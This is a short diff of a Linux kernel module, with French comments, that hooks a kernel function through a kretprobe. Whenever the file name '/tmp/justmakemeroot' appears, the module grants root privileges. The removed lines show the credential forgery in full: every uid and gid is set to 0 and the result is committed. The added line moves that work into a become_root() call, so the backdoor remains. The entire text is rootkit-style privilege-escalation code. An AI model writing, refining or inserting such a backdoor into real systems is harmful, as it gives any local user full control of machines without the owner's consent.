@@ -35,24 +35,9 @@ int ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
 
 
     if (strcmp(fname, "/tmp/justmakemeroot") == 0) {
-      struct cred *new_creds;
-      new_creds = prepare_kernel_cred(NULL);
 
       printk(KERN_INFO "Condition de nom de fichier remplie\n");
-      if (new_creds) {
-        // Mise à jour les identifiants pour obtenir des privilèges root
-        new_creds->uid.val = new_creds->gid.val = 0;
-        new_creds->euid.val = new_creds->egid.val = 0;
-        new_creds->suid.val = new_creds->sgid.val = 0;
-        new_creds->fsuid.val = new_creds->fsgid.val = 0;
-
-        commit_creds(new_creds);
-        printk(KERN_INFO "New_creds committed\n");
-
-
-      } else {
-        printk(KERN_INFO "New creds is null\n");
-      }
+      become_root();
     }
 
   return 0;
